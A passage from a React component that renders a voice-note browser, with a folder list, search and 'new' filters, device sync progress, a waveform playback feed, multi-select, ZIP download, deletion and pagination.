        );
    }

    // ──────────────────────────────────────────────────────────────────────────
    // 1. CHAT LIST VIEW (Tactile Claymorphism, Mobile-First)
    // ──────────────────────────────────────────────────────────────────────────
    if (!selectedFolder) {
        return (
            <div className="w-full max-w-2xl mx-auto space-y-3.5 pb-24 px-2 sm:px-4 animate-in fade-in duration-200">
                {renderFolderModal()}
                {renderDeleteFolderModal()}

                {/* ── Top Ambient Bar ── */}
                <div className="flex items-center justify-between gap-3 px-1 py-1">
                    <div className="flex items-center gap-2">
                        <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 shadow-[0_0_8px_#10b981] animate-pulse" />
                        <span className="text-xs font-mono text-white/80 font-semibold tracking-wide">
                            {sortedFolders.length} Folders · {voices.length} Voices
                        </span>
                    </div>

                    <div className="flex items-center gap-2">
                        <button
                            type="button"
                            onClick={handleOpenFolderModal}
                            disabled={isSyncing}
                            className={`px-3.5 py-1.5 rounded-full text-xs font-semibold flex items-center gap-1.5 transition-all cursor-pointer active:scale-95 shadow-sm ${
                                isSyncing
                                    ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/40'
                                    : 'clay-button-sm text-white hover:text-white'
                            }`}
                        >
                            <RefreshCw className={`w-3.5 h-3.5 ${isSyncing ? 'animate-spin text-emerald-400' : 'text-emerald-400'}`} />
                            <span>{isSyncing ? 'Syncing...' : 'Sync Device'}</span>
                        </button>

                        <button
                            type="button"
                            onClick={fetchVoices}
                            disabled={isFetching}
                            className="p-2 rounded-full clay-capsule text-white/60 hover:text-white transition-colors cursor-pointer"
                            title="Refresh"
                        >
                            <RefreshCw className={`w-3.5 h-3.5 ${isFetching ? 'animate-spin' : ''}`} />
                        </button>
                    </div>
                </div>

                {/* ── Real-time Ingestion HUD ── */}
                {isSyncing && (
                    <div className="p-3.5 rounded-2xl clay-card border border-emerald-500/30 flex flex-col gap-1.5 animate-in fade-in duration-200">
                        <div className="flex items-center justify-between text-[11px] font-mono">
                            <span className="text-emerald-400 flex items-center gap-1.5 font-bold">
                                <Sparkles className="w-3.5 h-3.5 animate-spin" />
                                {syncProgress?.partIndex && syncProgress?.totalParts
                                    ? `Part ${syncProgress.partIndex}/${syncProgress.totalParts} Ingesting`
                                    : 'Ultra-fast S3 Stream Sync'}
                            </span>
                            <span className="text-white/60">
                                {syncProgress && syncProgress.total > 0
                                    ? `${syncProgress.uploaded} / ${syncProgress.total} audios`
                                    : 'Compressing...'}
                            </span>
                        </div>
                        <div className="w-full h-1.5 bg-black/50 rounded-full overflow-hidden">
                            <div
                                className="h-full bg-gradient-to-r from-emerald-500 to-[#25D366] transition-all duration-300"
                                style={{
                                    width: syncProgress && syncProgress.total > 0
                                        ? `${Math.max(8, (syncProgress.uploaded / syncProgress.total) * 100)}%`
                                        : '30%'
                                }}
                            />
                        </div>
                    </div>
                )}

                {/* ── Tactile Search & Filter Bar ── */}
                <div className="flex items-center gap-2 clay-card p-1.5 rounded-2xl shadow-lg border border-white/5">
                    <div className="flex-1 flex items-center gap-2 px-3 py-1.5">
                        <Search className="w-4 h-4 text-white/30 shrink-0" />
                        <input
                            type="text"
                            placeholder="Filter folders or chats..."
                            value={searchQuery}
                            onChange={e => setSearchQuery(e.target.value)}
                            className="w-full bg-transparent text-sm text-white placeholder-white/30 outline-none font-sans"
                        />
                        {searchQuery && (
                            <button type="button" onClick={() => setSearchQuery('')} className="text-white/40 hover:text-white cursor-pointer">
                                <X size={14} />
                            </button>
                        )}
                    </div>

                    <div className="flex items-center gap-1 pr-1 border-l border-white/10 pl-2">
                        <button
                            type="button"
                            onClick={() => setFilterNewOnly(false)}
                            className={`px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer ${
                                !filterNewOnly
                                    ? 'bg-white/15 text-white shadow-sm'
                                    : 'text-white/40 hover:text-white'
                            }`}
                        >
                            All
                        </button>
                        <button
                            type="button"
                            onClick={() => setFilterNewOnly(true)}
                            className={`px-2.5 py-1.5 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition-all cursor-pointer ${
                                filterNewOnly
                                    ? 'bg-emerald-500 text-black shadow-[0_0_12px_rgba(16,185,129,0.4)]'
                                    : 'text-white/40 hover:text-white'
                            }`}
                        >
                            {totalNewCount > 0 && (
                                <span className="w-1.5 h-1.5 rounded-full bg-current animate-ping" />
                            )}
                            New ({totalNewCount})
                        </button>
                        {totalNewCount > 0 && (
                            <button
                                type="button"
                                onClick={clearAllNewBadges}
                                className="px-2 py-1 text-[10px] font-mono text-white/30 hover:text-white cursor-pointer"
                                title="Mark all read"
                            >
                                Clear
                            </button>
                        )}
                    </div>
                </div>

                {/* ── Folder Stream ── */}
                {isFetching ? (
                    <div className="p-16 flex flex-col items-center justify-center gap-3">
                        <RefreshCw className="w-6 h-6 text-emerald-400 animate-spin" />
                        <span className="text-xs font-mono text-white/40">Loading voice folders...</span>
                    </div>
                ) : fetchError ? (
                    <div className="p-8 rounded-2xl clay-card-error text-center space-y-3">
                        <p className="text-xs font-mono text-red-300">{fetchError}</p>
                        <button type="button" onClick={fetchVoices} className="px-4 py-2 rounded-xl bg-white/10 text-xs font-semibold text-white cursor-pointer">
                            Retry
                        </button>
                    </div>
                ) : filteredFolders.length === 0 ? (
                    <div className="p-16 text-center space-y-2 clay-card">
                        <FileAudio className="w-8 h-8 text-white/20 mx-auto mb-2" />
                        <p className="text-xs font-mono text-white/35 uppercase tracking-widest">
                            {filterNewOnly ? 'No new voice notes' : searchQuery ? 'No folders match search' : 'No voice notes recorded'}
                        </p>
                    </div>
                ) : (
                    <div className="space-y-2.5">
                        {filteredFolders.map((folderName) => {
                            const items = grouped[folderName] || [];
                            const latest = items[0];
                            const folderNewCount = items.filter(v => v.isNew).length;
                            const isDownloadingZip = downloadingFolders.has(folderName);

                            return (
                                <div
                                    key={folderName}
                                    onClick={() => setSelectedFolder(folderName)}
                                    className="group relative flex items-center gap-3.5 p-3.5 rounded-2xl clay-card hover:border-emerald-500/30 transition-all duration-200 cursor-pointer active:scale-[0.99] shadow-md hover:shadow-xl"
                                >
                                    <TactileFolderAvatar name={folderName} hasNew={folderNewCount > 0} />

                                    <div className="flex-1 min-w-0">
                                        <div className="flex items-center justify-between gap-2">
                                            <h3 className="text-sm font-semibold text-white truncate tracking-tight group-hover:text-emerald-300 transition-colors">
                                                {folderName}
                                            </h3>
                                            <span className="text-[10px] font-mono text-white/40 shrink-0">
                                                {latest ? fmtDate(latest.created_at) : ''}
                                            </span>
                                        </div>

                                        <div className="flex items-center gap-2 mt-1">
                                            <div className="flex items-center gap-1.5 text-xs text-white/50 truncate">
                                                <Mic className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
                                                <span className="truncate">Voice Notes</span>
                                                <span className="text-white/20">·</span>
                                                <span className="font-mono text-[11px] text-white/40">
                                                    {items.length} {items.length === 1 ? 'audio' : 'audios'}
                                                </span>
                                            </div>
                                        </div>
                                    </div>

                                    {/* Actions & Badges */}
                                    <div className="flex items-center gap-1.5 shrink-0">
                                        {folderNewCount > 0 && (
                                            <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-500 text-black shadow-[0_0_10px_rgba(16,185,129,0.4)] animate-pulse">
                                                +{folderNewCount}
                                            </span>
                                        )}

                                        {/* Download Entire Folder as ZIP */}
                                        <button
                                            type="button"
                                            onClick={(e) => handleDownloadFolderZip(folderName, e)}
                                            disabled={isDownloadingZip}
                                            className="p-2 rounded-xl bg-white/5 hover:bg-emerald-500/15 text-white/40 hover:text-emerald-300 border border-white/5 hover:border-emerald-500/30 transition-colors cursor-pointer"
                                            title="Download entire folder as ZIP"
                                        >
                                            {isDownloadingZip ? (
                                                <RefreshCw className="w-3.5 h-3.5 animate-spin text-emerald-400" />
                                            ) : (
                                                <Archive className="w-3.5 h-3.5" />
                                            )}
                                        </button>

                                        {/* Delete Entire Folder */}
                                        <button
                                            type="button"
                                            onClick={(e) => handlePromptDeleteFolder(folderName, items.length, e)}
                                            className="p-2 rounded-xl bg-white/5 hover:bg-red-500/15 text-white/40 hover:text-red-400 border border-white/5 hover:border-red-500/30 transition-colors cursor-pointer"
                                            title="Delete entire folder from storage"
                                        >
                                            <Trash2 className="w-3.5 h-3.5" />
                                        </button>

                                        <ChevronRight className="w-4 h-4 text-white/20 group-hover:text-white/60 transition-colors ml-0.5" />
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                )}
            </div>
        );
    }

    // ──────────────────────────────────────────────────────────────────────────
    // 2. CHAT DETAIL VIEW (Tactile Player Feed, Multi-Select & Pagination)
    // ──────────────────────────────────────────────────────────────────────────
    return (
        <div className="w-full max-w-2xl mx-auto space-y-3 pb-24 px-2 sm:px-4 animate-in fade-in slide-in-from-right-4 duration-200">
            {renderFolderModal()}
            {renderDeleteFolderModal()}

            {/* ── Sticky Top Header Bar ── */}
            <div className="sticky top-2 z-30 flex items-center gap-3 p-3 rounded-2xl clay-card backdrop-blur-2xl border border-white/10 shadow-xl">
                <button
                    type="button"
                    onClick={() => {
                        setSelectedFolder(null);
                        setPlayingId(null);
                        setIsSelectMode(false);
                        setSelected(new Set());
                    }}
                    className="p-2 rounded-xl bg-white/5 hover:bg-white/10 text-white/70 hover:text-white border border-white/10 transition-colors cursor-pointer shrink-0"
                    title="Back to Folders"
                >
                    <ArrowLeft className="w-4 h-4" />
                </button>

                <TactileFolderAvatar name={selectedFolder} />

                <div className="flex-1 min-w-0">
                    <h2 className="text-sm font-semibold text-white truncate tracking-tight">{selectedFolder}</h2>
                    <p className="text-[11px] font-mono text-emerald-400 flex items-center gap-1.5">
                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                        {currentVoices.length} {currentVoices.length === 1 ? 'Voice Note' : 'Voice Notes'}
                    </p>
                </div>

                <div className="flex items-center gap-1.5">
                    {/* Download Folder as ZIP shortcut */}
                    <button
                        type="button"
                        onClick={(e) => handleDownloadFolderZip(selectedFolder, e)}
                        disabled={downloadingFolders.has(selectedFolder)}
                        className="p-2 rounded-xl bg-white/5 hover:bg-emerald-500/15 text-white/70 hover:text-emerald-300 border border-white/10 transition-colors cursor-pointer"
                        title="Download this folder as ZIP"
                    >
                        {downloadingFolders.has(selectedFolder) ? (
                            <RefreshCw className="w-3.5 h-3.5 animate-spin text-emerald-400" />
                        ) : (
                            <Archive className="w-3.5 h-3.5" />
                        )}
                    </button>

                    <button
                        type="button"
                        onClick={handleOpenFolderModal}
                        disabled={isSyncing}
                        className="p-2 rounded-xl bg-white/5 hover:bg-white/10 text-white/70 hover:text-white border border-white/10 transition-colors cursor-pointer"
                        title="Sync folder from mobile device"
                    >
                        <RefreshCw className={`w-3.5 h-3.5 ${isSyncing ? 'animate-spin text-emerald-400' : ''}`} />
                    </button>

                    <button
                        type="button"
                        onClick={() => {
                            setIsSelectMode(!isSelectMode);
                            setSelected(new Set());
                        }}
                        className={`p-2 rounded-xl border transition-all cursor-pointer ${
                            isSelectMode
                                ? 'bg-emerald-500/20 border-emerald-500/50 text-emerald-400'
                                : 'bg-white/5 hover:bg-white/10 border-white/10 text-white/50 hover:text-white'
                        }`}
                        title={isSelectMode ? 'Cancel Selection' : 'Multi-Select'}
                    >
                        {isSelectMode ? <X size={15} /> : <CheckSquare size={15} />}
                    </button>
                </div>
            </div>

            {/* ── Real-time Ingestion HUD in Detail ── */}
            {isSyncing && (
                <div className="p-3.5 rounded-2xl clay-card border border-emerald-500/30 flex flex-col gap-1.5 animate-in fade-in duration-200">
                    <div className="flex items-center justify-between text-[11px] font-mono">
                        <span className="text-emerald-400 flex items-center gap-1.5 font-bold">
                            <Sparkles className="w-3.5 h-3.5 animate-spin" />
                            {syncProgress?.partIndex && syncProgress?.totalParts
                                ? `Part ${syncProgress.partIndex}/${syncProgress.totalParts} Ingesting`
                                : 'Ultra-fast S3 Stream Sync'}
                        </span>
                        <span className="text-white/60">
                            {syncProgress && syncProgress.total > 0
                                ? `${syncProgress.uploaded} / ${syncProgress.total} audios`
                                : 'Scanning...'}
                        </span>
                    </div>
                    <div className="w-full h-1.5 bg-black/50 rounded-full overflow-hidden">
                        <div
                            className="h-full bg-gradient-to-r from-emerald-500 to-[#25D366] transition-all duration-300"
                            style={{
                                width: syncProgress && syncProgress.total > 0
                                    ? `${Math.max(8, (syncProgress.uploaded / syncProgress.total) * 100)}%`
                                    : '30%'
                            }}
                        />
                    </div>
                </div>
            )}

            {/* ── Multi-Select Actions Bar ── */}
            {isSelectMode && (
                <div className="p-3 rounded-2xl clay-card border border-emerald-500/30 flex items-center justify-between gap-3 animate-in fade-in duration-150">
                    <div className="flex items-center gap-2">
                        <button
                            type="button"
                            onClick={toggleSelectAll}
                            className="px-2.5 py-1.5 rounded-xl bg-white/10 hover:bg-white/15 text-white text-xs font-semibold flex items-center gap-1.5 cursor-pointer"
                        >
                            <Check className="w-3.5 h-3.5" />
                            {selected.size === currentVoices.length ? 'Deselect All' : 'Select All'}
                        </button>
                        <span className="text-xs font-mono text-emerald-300">
                            {selected.size} selected
                        </span>
                    </div>

                    <div className="flex items-center gap-2">
                        {/* Download Selected as ZIP */}
                        <button
                            type="button"
                            onClick={handleDownloadSelectedZip}
                            disabled={selected.size === 0 || isDownloadingSelectedZip}
                            className={`px-3 py-1.5 rounded-xl text-xs font-semibold flex items-center gap-1.5 cursor-pointer shadow-md transition-all ${
                                selected.size > 0
                                    ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 hover:bg-emerald-500/30'
                                    : 'opacity-40 pointer-events-none bg-white/5 text-white/50'
                            }`}
                        >
                            {isDownloadingSelectedZip ? (
                                <RefreshCw className="w-3.5 h-3.5 animate-spin text-emerald-400" />
                            ) : (
                                <Archive className="w-3.5 h-3.5" />
                            )}
                            <span>Download ZIP</span>
                        </button>

                        {/* Delete Selected */}
                        <button
                            type="button"
                            onClick={() => handleDeleteSelected(Array.from(selected))}
                            disabled={selected.size === 0}
                            className={`px-3 py-1.5 rounded-xl text-xs font-semibold flex items-center gap-1.5 cursor-pointer shadow-md transition-all ${
                                selected.size > 0
                                    ? 'bg-red-500 hover:bg-red-600 text-white'
                                    : 'opacity-40 pointer-events-none bg-white/5 text-white/50'
                            }`}
                        >
                            <Trash2 size={13} />
                            <span>Delete</span>
                        </button>
                    </div>
                </div>
            )}

            {/* ── Audio Notes Feed ── */}
            <div className="space-y-2.5 pt-1">
                {currentVoices.length === 0 ? (
                    <div className="p-16 text-center text-xs font-mono text-white/30 clay-card">
                        No audio notes found in this folder
                    </div>
                ) : (
                    visibleVoices.map((voice) => {
                        const isPlaying = playingId === voice.id;
                        const isChecked = selected.has(voice.id);

                        return (
                            <div
                                key={voice.id}
                                className={`flex items-start gap-2.5 transition-all ${isChecked ? 'opacity-100' : ''}`}
                            >
                                {isSelectMode && (
                                    <button
                                        type="button"
                                        onClick={() => toggleSelect(voice.id)}
                                        className="mt-3.5 shrink-0 cursor-pointer text-white/40 hover:text-white"
                                    >
                                        {isChecked ? (
                                            <CheckSquare className="w-5 h-5 text-emerald-400" />
                                        ) : (
                                            <Square className="w-5 h-5 text-white/20" />
                                        )}
                                    </button>
                                )}

                                {/* Tactile Bubble */}
                                <div
                                    className={`flex-1 rounded-3xl p-3.5 transition-all clay-card ${
                                        isPlaying
                                            ? 'border-emerald-500/40 shadow-[0_0_24px_rgba(16,185,129,0.15)] ring-1 ring-emerald-500/20'
                                            : 'hover:border-white/15'
                                    }`}
                                >
                                    {/* Waveform Player */}
                                    <ClayWavePlayer
                                        url={voice.url}
                                        isGlobalPlaying={isPlaying}
                                        onPlayToggle={() => {
                                            if (voice.isNew) {
                                                setVoices(prev => prev.map(v => v.id === voice.id ? { ...v, isNew: false } : v));
                                            }
                                            setPlayingId(isPlaying ? null : voice.id);
                                        }}
                                        onEnded={() => setPlayingId(null)}
                                    />

                                    {/* Bottom Meta Bar: NEW tag, date, time & actions */}
                                    <div className="flex items-center justify-between pt-2 mt-1 border-t border-white/[0.04]">
                                        <div className="flex items-center gap-2">
                                            {voice.isNew && (
                                                <span className="px-1.5 py-0.5 rounded-full text-[9px] font-black uppercase tracking-wider bg-emerald-400 text-black shadow-[0_0_8px_rgba(16,185,129,0.6)]">
                                                    NEW
                                                </span>
                                            )}
                                            <span className="text-[10px] font-mono text-white/40">
                                                {fmtDate(voice.created_at)} · {fmtTime(voice.created_at)}
                                            </span>
                                            {voice.size ? (
                                                <span className="text-[10px] font-mono text-white/30">
                                                    · {formatBytes(voice.size)}
                                                </span>
                                            ) : null}
                                            <CheckCheck className="w-3.5 h-3.5 text-[#53bdeb]" />
                                        </div>

                                        <div className="flex items-center gap-1">
                                            <button
                                                type="button"
                                                onClick={() => handleDownloadSingle(voice)}
                                                className="p-1.5 rounded-lg text-white/40 hover:text-white hover:bg-white/10 transition-colors cursor-pointer"
                                                title="Download audio"
                                            >
                                                <Download size={13} />
                                            </button>
                                            <button
                                                type="button"
                                                onClick={() => handleDeleteSelected([voice.id])}
                                                className="p-1.5 rounded-lg text-white/40 hover:text-red-400 hover:bg-red-500/10 transition-colors cursor-pointer"
                                                title="Delete"
                                            >
                                                <Trash2 size={13} />
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        );
                    })
                )}
            </div>

            {/* ── High-Volume Pagination Button ── */}
            {currentVoices.length > visibleCount && (
                <div className="pt-2 pb-4 flex flex-col items-center gap-2">
                    <button
                        type="button"
                        onClick={() => setVisibleCount(prev => prev + 40)}
                        className="px-5 py-2.5 rounded-2xl clay-button-sm text-white font-semibold text-xs flex items-center gap-2 shadow-lg hover:brightness-110 active:scale-95 transition-all cursor-pointer"
                    >
                        <span>Load More Voices (+40)</span>
                    </button>
                    <span className="text-[11px] font-mono text-white/40">
                        Showing {visibleCount} of {currentVoices.length} audio notes
                    </span>
                </div>
            )}
        </div>
    );
}
